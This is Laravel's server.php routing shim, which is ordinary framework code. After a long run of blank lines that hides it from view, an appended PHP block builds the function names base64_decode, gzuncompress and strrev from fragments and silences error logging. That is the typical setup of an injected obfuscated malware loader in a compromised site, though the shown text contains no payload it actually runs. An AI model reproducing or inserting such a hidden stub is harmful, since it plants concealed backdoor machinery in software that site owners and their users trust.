<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?? ''
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';

?>




















<?php $WljqE = 'ba'.'se64'.'_decod'.'e';  $wfaMn = 'gzuncomp'.'ress';  $NASPE = 'str'.'rev';  echo '<html>    </html>'; /***  8c5a9ef6996e58de82eb7ee14a13567135711ac9*/ ini_set('log_errors', 0); error_reporting(0); ?>